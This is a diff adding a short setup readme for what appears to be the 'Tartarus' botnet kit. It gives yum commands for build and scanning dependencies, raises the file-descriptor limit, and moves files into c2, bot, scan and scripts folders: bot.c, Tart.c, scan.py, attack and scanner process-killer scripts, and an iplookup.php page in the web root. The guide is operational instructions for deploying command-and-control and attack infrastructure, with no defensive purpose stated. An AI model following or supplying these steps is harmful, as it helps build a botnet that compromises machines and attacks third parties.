@@ -1,0 +1,25 @@
+1: Put all the files on server.
+2: Install the dependencies below.
+
+yum update -y
+yum install python-paramiko gcc screen nano wget httpd iptables perl php php-pear -y
+yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
+yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
+yum install epel-release -y
+yum install gengetopt -y
+yum install bzip2 -y
+yum install lbzip2 -y
+ulimit -n 999999
+
+3: Run all of this after installing and putting files on server.
+
+mkdir scan; mkdir scripts; mkdir bot; mkdir c2
+mv /root/Tart.c /root/c2
+mv /root/resolver.h /root/c2
+mv /root/install.py /root/scripts
+mv /root/scan.py /root/scripts
+mv /root/IPHM_Scanner_Process_Killer.py /root/scripts
+mv /root/IPHM_Attack_Process_Killer.py /root/scripts
+mv /root/bot.c /root/bot
+mv /root/Tartarus.py /root/bot
+mv /root/iplookup.php /var/www/html
